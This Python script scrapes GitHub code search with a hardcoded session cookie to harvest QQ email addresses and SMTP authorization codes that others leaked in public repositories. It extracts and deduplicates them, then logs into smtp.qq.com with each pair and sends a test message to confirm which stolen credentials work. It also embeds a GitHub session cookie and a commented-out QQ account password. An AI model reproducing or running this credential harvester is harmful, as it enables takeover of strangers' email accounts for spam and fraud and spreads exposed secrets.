import requests
from scrapy.selector import Selector
import re
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr
import random


def get_msg(url):
    try:
        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
                   'Cookie':'_octo=GH1.1.1427565614.1500214088; _ga=GA1.2.1679617752.1500214088; user_session=DILLJ3p6fanOA2jfbC7Pxx2cCKCIfRXTqTuhodwESwLk1UP4; __Host-user_session_same_site=DILLJ3p6fanOA2jfbC7Pxx2cCKCIfRXTqTuhodwESwLk1UP4; logged_in=yes; dotcom_user=xhongc; tz=Asia%2FShanghai; _gat=1; _gh_sess=cWVTeVRiQ0piY2R6Y05xd0t5UmE5TGtqQ1FwQkhCUXB3eXovMWl0UC9TbnpZb0ZxTEZGeUZxb3lLWjhBNDhCWjlXTDhBZE1iWTJqUmRUZktDV1VpMlZ0QVV4aHk2c01GRzVzQVFnQzBBdGkvU0V1K3lvK2R2SCtWYkVqQ0cvanVBTUFEbnpPemRiN2sxclZuQmdhK1lJcG5BZ2hkQ2VDbjB2cW4xbU9EVFdkcThxSUNMU2ttbFhYWklzbFhoZ3pJQ3NuV253b1FFM2xIc1BiNWp4TFhlSVRWYVNWamdCWjQ4Mm1yUTRRQUc5VT0tLXFzOW4zYzBQQnovNlBSVmV5SUdBeUE9PQ%3D%3D--8f0aa1b2b5907a913090c3b55518ab05c1177cea',
                   'X-Requested-With': 'XMLHttpRequest',
                   'Referer':'https://github.com/search?utf8=%E2%9C%93&q=smtp+qq+pass&type=Code'}

        html = requests.get(url,headers=headers)
        # print(html.text)

        selector = Selector(html)
        res = selector.xpath("//div[@class='code-list-item col-12 py-4 code-list-item-public ']/div[@class='file-box blob-wrapper']/table[@class='highlight']")
        # print(res)
        for each in res:
            title = each.xpath("./tr").extract()
            title = ''.join(title)
            result = re.findall(r'>(.*?)<',title)
            result = ''.join(result)
            print(result)
            f.write(result+'\n')
            time.sleep(1)
    except:
        pass

def main():
    f = open('git_reslt.txt', 'a')
    threads = []
    for page in range( 81, 101):
        url = 'https://github.com/search?utf8=%E2%9C%93&q=smtp+163&type=Code&p={0}'.format(page)
        t=threading.Thread(target = get_msg, args =(url,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print('finish 20 page')
    f.close()

def extract_qq_mail():
    f1 = open('git_reslt.txt','r')
    f2 = open('qq_result.txt','a')
    for each in f1.readlines():
        try:
            qq_num = re.search('([0-9]{6,11}\@qq.com)', each).group(1)
            key_words = re.search('([a-zA-Z]{16})',each).group(1)
            print(qq_num,key_words)
            f2.write(qq_num)
            f2.write('/')
            f2.write(key_words+'\n')
        except:
            pass
    f1.close()
    f2.close()

def distinct():
    f = open('qq_result.txt','r')
    f2 = open('distinct_qq_num.txt','a')
    res = f.readlines()
    res = set(res)
    for each in res:
        f2.write(each)
    f.close()
    f2.close()

def judge_ok(qq,key,f):
    mail_host = "smtp.qq.com"  # 设置服务器
    # mail_user = "1184405959@qq.com"  # 用户名
    # mail_pass = "dwjybikeqdawhhbc"  # 口令,QQ邮箱是输入授权码，在qq邮箱设置 里用验证过的手机发送短信获得，不含空格
    # sender = '1184405959@qq.com'
    mail_user = qq  # 用户名
    mail_pass = key  # 口令,QQ邮箱是输入授权码，在qq邮箱设置 里用验证过的手机发送短信获得，不含空格
    sender = qq
    msg = """
        ...<br>
        ...<br>
        ...<br>
        <p><a href="http://www.runoob.com">这是一个链接</a></p>

        """
    message = MIMEText(msg, 'html', 'utf-8')
    # 　message['From'] = Header("408737515", 'utf-8')
    # message['To'] = Header("you", 'utf-8')
    message['From'] = formataddr(["abcdefg", mail_user])
    subject = 'hello'
    message['Subject'] = Header(subject, 'utf-8')
    ###################


    smtpObj = smtplib.SMTP_SSL(mail_host, 465)
    smtpObj.login(mail_user, mail_pass)
    each = '3555209855@qq.com'
    # print(each)
    # receivers = []  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
    # receivers.append(each)
    try:
        smtpObj.sendmail(sender, each, message.as_string())
        print(u"邮件发送成功：%s" % (each))
        f.write(qq)
        f.write('/')
        f.write(key+'\n')
    except:
        print(u"邮件发送失败: %s" % each)
    smtpObj.quit()
    time.sleep(random.uniform(4, 6))
def run():
    f = open('result_ok_qq.txt', 'a')
    f2 = open('distinct_qq_num.txt', 'r')
    for each in f2.readlines():
        qq = each.split('/')[0]
        key = each.split('/')[1]
        try:
            judge_ok(qq, key, f)
        except:
            pass
if __name__ == '__main__':
    main()
